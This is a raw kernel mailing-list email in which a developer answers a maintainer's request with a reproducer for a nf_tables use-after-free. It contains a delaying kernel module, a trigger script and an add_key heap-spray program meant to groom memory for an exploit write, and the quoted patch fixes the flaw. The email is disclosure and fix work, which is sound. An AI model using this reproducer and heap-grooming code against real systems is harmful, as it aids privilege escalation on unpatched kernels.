Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.remote-ip=74.125.230.70
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=fail;
	t=1793884538;
	b=KdM1Qy68YfFW7iU/Q9mPOdw52TQDcrERJIh97aKB1zrcd09sRxUzB2aBSoD53u8xILsg
	 0YeGp8WWacuyFjxET43OAOv50vwCeO7e1hcSTsJf9LOWiSASMC0rFEfyqnRfALXEryu76
	 BN1r+/3WE2gmmbyxxqh9eUlbttAe61Bm6YZY3MGUwMI6QcMNNNC6cbaXNHIWtJwF3HnLX
	 y4Ws8MUYOVT/texBl1XbmUDaMsuaTYHIRykQvWP79/Y37TUFOvXr/IzECwCyLDQ9Mzlkp
	 svXKdZCcaWqupKSWljq8ZClLiHw8W21dRacjOeqOnNpQtOVFM4lKEoQlYkURxsRv6Yg==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793884538;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
	bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
	b=TGrsAqKn6y6rsX2kO2GrB9qW841xl2hzHRQj4uel4uj4lQ5tIN92qzoZ/Pr3zhf9Xb2N
	 1TD5C3Z0REfTidzwcXAkM+JLTc/xOjj+rmvywo47p+EKtNarjTv9n0uUqqu3Z2/dFcOrf
	 03pFmNkW1OFPSblhMr4lG9BEmUvvGigGpAr/mlUtgWz0r8Qh9JKiYdjbzFG7387o5RLke
	 KKlJLzXo85JEHLgGYhYvpHI8BvSJOqvYchEQoZgK77heTtEw9wMuvcgmCF369ulWnajay
	 ukcH8uhhJygEW4iLz2KvQ6S3s1R8P7qK7exoVX8IzVwXGgCIYfRqumjkZrLM8q3KfRA==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=SKq0qtKH;
	arc=fail smtp.remote-ip=74.125.230.70
Received: from mail-lr2-f6.google.com (mail-lr2-f6.google.com [74.125.230.70])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 399CD606A330
	for <netfilter-devel@vger.kernel.org>; Thu,  5 Nov 2026 13:15:37 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 399CD606A330
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=SKq0qtKH
Received: by mail-lr2-f6.google.com with SMTP id 38308e7fff4ca-3ab1bfd1373so13170961fa.0
        for <netfilter-devel@vger.kernel.org>; Thu, 05 Nov 2026 05:15:37 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1793884536; cv=none;
        d=google.com; s=arc-20260327;
        b=dLS5dq4KLrf6vdZY9PRR5qJEOXbbVlyhmwb3G0O71SOrjjn9n+sRi4GoV9yZujWyBq
         zIcPomLMt3io3+CV4HHyx4l7WMAlwXiubANTH2uqYbsmbMpXSW0ln7ZfKlpEHzbCU29M
         l+JNXziDtOrODI/989WdGm6dXkSZz6L8axThu5P/CEaahTTD4NJMZGWfnbHAVrpBBj7D
         Ij1XvL+H0WgEgGicS+waAtDGgecYr80by1XZ7GR/yObRRlOA+8m40T1Ohhe3aLLe4E8o
         dJAPNjTCAUIVCac8H/CbdA2MuMlViQ3smyur4qoKtWR+Z8teQsT8ouAPRbKHZDJmpeDL
         976g==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
        fh=PUC6nPQiOOfU/6pLEe35SWCzsnPR2O9J+s1TSHiCbkk=;
        b=H4iYBy25LgWiNguSM+5cLS5PsZm0oFczUKKIPTk3T1RD7hv+cBijiG27DlfTqRA+B8
         9nuHOXXH7hLvrvrn60qUkM/eMXOIbiKBwbJGnrBo6tSwAHLYgId/eQLBOaKQEmozEFOo
         mS36HyCua3QxkUxtjiQ88RuzCsGMA2ZUEqE2LcSj/SMUkDo4k9SLCc5z/95vRjZYdjMo
         fDfpjoebb3OpmnDmsXrWLMItkf7DRxag2kR+Mowb4vdJkpUlujE1CJhy5lu/F8UMMxBI
         oN3FOyzEo5nD5fyiq1LAE6F1NSdeqV02e8bKYZQsSp9IAy6wAVL3KnqZ5Y1/rHQPByOk
         R0Xw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1793884536; x=1794489336; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
        b=SKq0qtKHaz5hlZzzTc7tYusebAdye49P8RO5vtq6FFmszGBtaIGPg/SBRjQhf7oyVy
         QXskfHMzh4p2aujMCA189WGErSLX8ZNpF1pE7n2CjUMVD32eEYm6g0fNrNBdKKeAraCN
         YGFzWkOv3ILiaImplylRCGTF9nY+BW4pKFB0tIM22RFrCL3hXNSv/a5vouo1DQtXi0lw
         BaRGmPUt00FyTjjLhQsjN2jDU5PL9FV/ZrwfWAY6QO+Y7xX/VpPQ3j1l43CvzjyT7WoE
         pW1MD4UW1iyvGEmw2nCFgveDySRtH5yaJ3Pg/lHfBhv+BHs6pRwNpBKog9OjCiuBgo5y
         TjMg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1793884536; x=1794489336;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
        b=MyqEIt6yYnDZGT9sma2HNGlnTjpkvR9E001tBjG3e+RF1rkVSOCFQbjqRi9MK8IAwD
         +1C9rOVZfq/8i2oF5tKWg/NHUdDdJdvy7zBCoFBlw1T2Q/Lxi2OIG+XBzPs3LtVJbIh3
         f4LQR4KrMGLn/78l6LytYRjHmJ/jNCkC73ix8r8AVgktkB+dXDYWbui21uRff0ynci/B
         CrX2OjgzTZ0SbvQ4X1K+sv948S0PmVgRYNj1jguLvU1JGoVE2xCFeQDjzWpWwnPT8bvJ
         4MSdlZXUQML1Fwh/9i4AhZd5E+YXNFxjvKPu7anw/h7l6cgr56XO7uC+MEft0fa9iaRu
         y8KA==
X-Forwarded-Encrypted: i=1; AKwUvBwxAWxgb7eJl+f9x/x/4NAMrRxw2tsVZjLfzOIggCtx32lbtURMQfwpAu652rCqTN/TqOyDFPy7Q+n6uUNEgKo=@vger.kernel.org
X-Gm-Message-State: APuU4Z8GM43bKKR1oRKM2B5JLoWquy+jVqEl9xyV9ZCps0lceYhDh7Hl
	NEKsWJGvzfYddqiDCMOr0cCrLO/N314PkjLO9GsWvFStAMrW5epadL228nHEFcvY06ifzjZkWfX
	7FGusFWEsGy+2k6/KorDuNlzYEMjcY6w=
X-Gm-Gg: AYBFou3s9RG9fDFsyu7IzkWRq3Z1whgIN7bcsbW7tyCT/WRsXhL3nXLrU5ZsPhLmauo
	Ubrb3KzVnFIpkAqWP5Bw6KUibKqPVuumCt9R876s2Mvlt/WUAgAgu8eczR2sLoPTf2q9YtODZKZ
	urhWj/dkKCSBWYFl2qsQfGS6bEjTfaHim7xwEWNXF5Z1Nr4soc0gFYfRWX/SJWNgWAsE+V25gWk
	1myjQVoncnVA6eq44zdhU3MXkWKR2RBoh47NTXlF60tZ7VkrK7KTUtFMhzSPTmc9VGxjFynhC83
	VZHJjT7Iae5UULUiz4WPL5+rECBBwWAw2atQM9qdpdWaypay3mTrZ0mQ4SXAbKs9AcMWXEPaZCc
	GfT/2IdaYdcGJ8vjOoPGKcUf2Hpwn1drlZWc+
X-Received: by 2002:a05:6512:2345:b0:5bf:c17e:a62d with SMTP id
 2adb3069b0e04-5bfd9576996mr6637900e87.57.1793884535718; Thu, 05 Nov 2026
 05:15:35 -0800 (PST)
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Post: <mailto:netfilter-devel@vger.kernel.org>
List-Help: <mailto:netfilter-devel+help@vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netfilter-devel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
References: <20261105114817.3033625-1-bsdhenrymartin@gmail.com> <aux2zX3dLKYnzG56@chamomile>
In-Reply-To: <aux2zX3dLKYnzG56@chamomile>
From: henry martin <bsdhenrymartin@gmail.com>
Date: Thu, 5 Nov 2026 21:15:24 +0800
X-Gm-Features: AclHuK-jZr7CdFgzP-G6uFCKjos8f9kbJbc8PNhLiWtDX1q3Lnk7XQ_JLtzv6XM
Message-ID: <CAEnQdOox6ddd_GScf24z65bocnMvX0KHeDTju_8j3bzQjLi0HQ@mail.gmail.com>
Subject: Re: [PATCH] netfilter: nf_tables: fix pernet use-after-free on
 UNREGISTER rebroadcast
To: Pablo Neira Ayuso <pablo@netfilter.org>
Cc: fw@strlen.de, davem@davemloft.net, edumazet@kernel.org, kuba@kernel.org, 
	pabeni@redhat.com, netfilter-devel@vger.kernel.org, coreteam@netfilter.org, 
	netdev@vger.kernel.org, stable@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Pablo,

Full reproducer below; runs as root in a KASAN guest. Verified on
v7.4-rc1 (6628e7d4c6b2c): unpatched, the quoted splat (freed by
net_passive_dec <- cleanup_net); patched, zero reports and all three
notifiers hit the new guard 91/91/91 times over the rebroadcast window.

delayer.ko only simulates a driver holding a reference with a delay
across NETDEV_UNREGISTER - the same delay source as the netdevsim
case in the original netdev-genl syzbot report; it is an environment
aid, not part of the bug.

1) delayer.c - helper module (build: make -C <kernel tree> M=3D$PWD modules=
):

// delayer.c - holds a device reference with a delay across NETDEV_UNREGIST=
ER
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netdevice.h>
#include <linux/workqueue.h>

static char *watch_dev =3D "vethA";
module_param(watch_dev, charp, 0444);
static int delay_secs =3D 15;
module_param(delay_secs, int, 0444);

static void delayer_put(struct work_struct *w);
static struct delayed_work dw;
static struct net_device *held;

static void delayer_put(struct work_struct *w)
{
if (held) {
pr_info("delayer: dev_put %s\n", held->name);
dev_put(held);
held =3D NULL;
}
}

static int delayer_event(struct notifier_block *nb, unsigned long ev, void =
*ptr)
{
struct net_device *dev =3D netdev_notifier_info_to_dev(ptr);

if (ev =3D=3D NETDEV_UNREGISTER && !strcmp(dev->name, watch_dev) && !held) =
{
dev_hold(dev);
held =3D dev;
schedule_delayed_work(&dw, delay_secs * HZ);
pr_info("delayer: holding %s for %ds\n", dev->name, delay_secs);
}
return NOTIFY_DONE;
}

static struct notifier_block delayer_nb =3D { .notifier_call =3D delayer_ev=
ent };

static int __init delayer_init(void)
{
INIT_DELAYED_WORK(&dw, delayer_put);
return register_netdevice_notifier(&delayer_nb);
}

static void __exit delayer_exit(void)
{
cancel_delayed_work_sync(&dw);
unregister_netdevice_notifier(&delayer_nb);
if (held)
dev_put(held);
}

module_init(delayer_init);
module_exit(delayer_exit);
MODULE_LICENSE("GPL");

2) repro.sh - the trigger (prerequisite: insmod delayer.ko
watch_dev=3DvethA delay_secs=3D60):

#!/bin/bash
set -e
ip link add vethA type veth peer name vethB
ip link set vethB up
ip netns add A
ip link set vethA netns A
ip -n A link set lo up
ip -n A link set vethA up
dmesg -C
ip link del vethB &
sleep 0.5
ip netns del A
sleep 20
dmesg | grep -cE 'KASAN|BUG: '

3) sprayer.c - heap groom for the write leg only, not needed for the
   splat (sprays user_key_payload, kmalloc-256 non-cg):

// sprayer.c - spray kmalloc-256 non-cg objects via add_key
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#define __NR_add_key 248
#define PLEN 216
int main(int argc, char **argv) {
    unsigned char buf[PLEN];
    memset(buf, argc > 1 ? argv[1][0] : 'A', PLEN);
    int n =3D argc > 2 ? atoi(argv[2]) : 3000;
    int ids =3D 0;
    for (int i =3D 0; i < n; i++) {
        char desc[32];
        snprintf(desc, sizeof(desc), "spray_%d", i);
        long r =3D syscall(__NR_add_key, "user", desc, buf, PLEN, -2);
        if (r >=3D 0) ids++;
    }
    printf("sprayed %d keys\n", ids);
    pause();
    return 0;
}

Run: insmod delayer.ko watch_dev=3DvethA delay_secs=3D60; ( ./sprayer A
4000 & ); bash repro.sh

Thanks,
Henry

Pablo Neira Ayuso <pablo@netfilter.org> =E4=BA=8E2026=E5=B9=B411=E6=9C=885=
=E6=97=A5=E5=91=A8=E5=9B=9B 20:30=E5=86=99=E9=81=93=EF=BC=9A
>
> On Thu, Nov 05, 2026 at 07:48:17PM +0800, Henry Martin wrote:
> > A device unregistered outside its netns teardown can be stuck in
> > netdev_wait_allrefs_any() while the pernet exit handlers of its
> > netns run to completion.  The nftables pernet storage is freed on
> > that path.  The rebroadcasts then hit the nf_tables netdev
> > notifiers (base chain, flowtable, offload), which read the freed
> > storage via nft_pernet() and take commit_mutex on it, e.g. on
> > mainline v7.4-rc1 (KASAN build):
> >
> >     BUG: KASAN: slab-use-after-free in nf_tables_netdev_event+0x17c
> >     Read of size 8 at addr ffff88811061c980 by task ip/422
> >     Call Trace:
> >      nf_tables_netdev_event+0x17c/0x1c0
> >     Freed by task 62:
> >      kfree+0x161/0x450
> >      net_passive_dec+0xe5/0x180
> >      cleanup_net+0x45a/0x780
>
> Could ypu pass on a reproducer?
>
> > Skip the rebroadcasts in all three notifiers, which are the only
> > NETDEV_UNREGISTER events delivered with reg_state =3D=3D
> > NETREG_UNREGISTERED.  This mirrors commit fd0909e963ed8
> > ("netdev-genl: ignore NETDEV_UNREGISTER rebroadcasts").
> >
> > This issue was discovered by Tencent CodeBuddy Security.
> >
> > Fixes: 8a4fc54b07d75 ("net: get rid of rtnl_lock_unregistering()")
> > Cc: stable@vger.kernel.org
> > Signed-off-by: Henry Martin <bsdhenrymartin@gmail.com>
> > ---
> >  net/netfilter/nf_tables_api.c     | 9 +++++++++
> >  net/netfilter/nf_tables_offload.c | 8 ++++++++
> >  net/netfilter/nft_chain_filter.c  | 9 +++++++++
> >  3 files changed, 26 insertions(+)
> >
> > diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_ap=
i.c
> > index 59ac623e6805f..e43a1b9fefc36 100644
> > --- a/net/netfilter/nf_tables_api.c
> > +++ b/net/netfilter/nf_tables_api.c
> > @@ -9902,6 +9902,15 @@ static int nf_tables_flowtable_event(struct noti=
fier_block *this,
> >           event !=3D NETDEV_CHANGENAME)
> >               return NOTIFY_DONE;
> >
> > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
> > +      * while waiting for the last references to be dropped; the
> > +      * netns and its nftables pernet storage may already be torn
> > +      * down by then.
> > +      */
> > +     if (event =3D=3D NETDEV_UNREGISTER &&
> > +         READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
> > +             return NOTIFY_DONE;
> > +
> >       net =3D dev_net(dev);
> >       nft_net =3D nft_pernet(net);
> >       mutex_lock(&nft_net->commit_mutex);
> > diff --git a/net/netfilter/nf_tables_offload.c b/net/netfilter/nf_table=
s_offload.c
> > index 0ac3c26dfb3d1..d360e233d0366 100644
> > --- a/net/netfilter/nf_tables_offload.c
> > +++ b/net/netfilter/nf_tables_offload.c
> > @@ -672,6 +672,14 @@ static int nft_offload_netdev_event(struct notifie=
r_block *this,
> >       if (event !=3D NETDEV_UNREGISTER)
> >               return NOTIFY_DONE;
> >
> > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
> > +      * while waiting for the last references to be dropped; the
> > +      * netns and its nftables pernet storage may already be torn
> > +      * down by then.
> > +      */
> > +     if (READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
> > +             return NOTIFY_DONE;
> > +
> >       nft_net =3D nft_pernet(net);
> >       mutex_lock(&nft_net->commit_mutex);
> >       chain =3D __nft_offload_get_chain(nft_net, dev);
> > diff --git a/net/netfilter/nft_chain_filter.c b/net/netfilter/nft_chain=
_filter.c
> > index e04e689f22284..b3cfe8d426753 100644
> > --- a/net/netfilter/nft_chain_filter.c
> > +++ b/net/netfilter/nft_chain_filter.c
> > @@ -412,6 +412,15 @@ static int nf_tables_netdev_event(struct notifier_=
block *this,
> >           event !=3D NETDEV_CHANGENAME)
> >               return NOTIFY_DONE;
> >
> > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
> > +      * while waiting for the last references to be dropped; the
> > +      * netns and its nftables pernet storage may already be torn
> > +      * down by then.
> > +      */
> > +     if (event =3D=3D NETDEV_UNREGISTER &&
> > +         READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
> > +             return NOTIFY_DONE;
> > +
> >       nft_net =3D nft_pernet(dev_net(dev));
> >       mutex_lock(&nft_net->commit_mutex);
> >
> > --
> > 2.43.7
> >
